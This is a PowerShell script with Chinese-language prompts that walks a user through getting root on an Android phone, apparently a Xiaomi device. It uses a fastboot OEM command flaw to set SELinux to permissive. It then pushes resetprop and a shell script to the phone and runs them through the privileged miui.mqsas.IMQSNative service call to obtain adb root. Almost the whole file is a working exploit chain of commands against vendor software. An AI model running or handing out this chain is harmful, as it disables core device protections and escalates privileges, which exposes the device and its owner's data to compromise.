[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ADB_PATH = (Resolve-Path -Path ..\adb).Path
$env:PATH += ";$ADB_PATH"

# 1. 初始准备阶段
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "          第一步：准备进入 Fastboot 模式" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan
Write-Host "📱 请完成以下操作：" -ForegroundColor Yellow
Write-Host "   1. 打开开发者模式（设置-关于手机-连续点击版本号）" -ForegroundColor White
Write-Host "   2. 解锁手机并进入系统桌面" -ForegroundColor White
Write-Host "   3. 确保手机已连接电脑并允许 USB 调试`n" -ForegroundColor White
Write-Host "✅ 操作完成后按任意键继续..." -NoNewline -ForegroundColor Green
[void][System.Console]::ReadKey($true)

# 检查设备连接状态
Write-Host "`n🔍 正在检测已连接的设备..." -ForegroundColor Yellow
adb devices
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ 检测到ADB命令执行失败，请检查 ADB 环境或设备连接！" -ForegroundColor Red
    pause
    exit 1
}

# 重启到 Fastboot 模式
Write-Host "`n🚀 正在重启设备进入 Fastboot 模式..." -ForegroundColor Yellow
adb reboot bootloader
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ 命令执行失败！" -ForegroundColor Red
    pause
    exit 1
}

# 2. Fastboot 模式操作阶段
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "          第二步：Fastboot 模式配置" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan
Write-Host "📱 请确认设备已进入 Fastboot 模式（屏幕显示 Fastboot 字样）`n" -ForegroundColor Yellow
Write-Host "✅ 确认后按任意键继续..." -NoNewline -ForegroundColor Green
[void][System.Console]::ReadKey($true)

# 执行 Fastboot 配置命令
Write-Host "`n⚙️  正在通过漏洞设置 SELinux 为 Permissive ..." -ForegroundColor Yellow
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ 命令执行失败！" -ForegroundColor Red
    [void][System.Console]::ReadKey($true)
    exit 1
}

# 继续启动系统
Write-Host "🚀 正在引导设备进入系统..." -ForegroundColor Yellow
fastboot continue
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ 命令执行失败！" -ForegroundColor Red
    [void][System.Console]::ReadKey($true)
    exit 1
}

# 3. 系统启动后操作阶段
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "          第三步：推送文件并提权" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan
Write-Host "📱 请在设备开机后解锁进入桌面`n" -ForegroundColor Yellow
Write-Host "✅ 进入桌面后按任意键继续..." -NoNewline -ForegroundColor Green
[void][System.Console]::ReadKey($true)

# 等待设备连接
Write-Host "`n🔍 正在等待设备 ADB 连接..." -ForegroundColor Yellow
adb wait-for-device
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ 设备 ADB 连接超时！" -ForegroundColor Red
    [void][System.Console]::ReadKey($true)
    exit 1
}

# 推送 resetprop 文件
Write-Host "📤 正在推送 resetprop 文件到 /data/local/tmp/resetprop ..." -ForegroundColor Yellow
adb push resetprop /data/local/tmp/
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ resetprop 文件推送失败！" -ForegroundColor Red
    [void][System.Console]::ReadKey($true)
    exit 1
}
adb shell chmod +x /data/local/tmp/resetprop

# 推送 rsp.sh 脚本
Write-Host "📤 正在推送 rsp.sh 脚本到 /data/local/tmp/rsp.sh ..." -ForegroundColor Yellow
adb push ./rsp.sh /data/local/tmp/
if ($LASTEXITCODE -ne 0) {
    Write-Host "❌ rsp.sh 脚本推送失败！" -ForegroundColor Red
    [void][System.Console]::ReadKey($true)
    exit 1
}

# 执行 rsp.sh 脚本
Write-Host "⚙️  正在执行 rsp.sh 脚本..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 300
adb shell service call miui.mqsas.IMQSNative 21 i32 1 s16 "sh" i32 1 s16 "/data/local/tmp/rsp.sh" s16 "/sdcard/resetprop.txt" i32 60
if ($LASTEXITCODE -ne 0) {
    Write-Host "⚠️  rsp.sh 脚本执行可能存在异常，请检查位于 /sdcard/resetprop.txt 的日志输出！" -ForegroundColor Yellow
}

# 等待设备重新连接
Write-Host "`n🔍 等待 ADB 服务重启并重新连接设备..." -ForegroundColor Yellow
adb wait-for-device

# 获取Root权限
Write-Host "`n🔑 正在尝试获取 Root 权限 ..." -ForegroundColor Yellow
$RESULT = adb root | Out-String
$RESULT = $RESULT.Trim()
if ($RESULT -eq "adbd is already running as root") {
    Write-Host "✅ 已成功获取 adb root 权限！" -ForegroundColor Green
} else {
    Write-Host "❌ 未能获取 adb root 权限！" -ForegroundColor Red
}

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "          脚本执行完成！" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan
Write-Host "📌 请检查以上输出信息，确认所有步骤是否成功完成。" -ForegroundColor Yellow
Start-Sleep -Seconds 30
pause
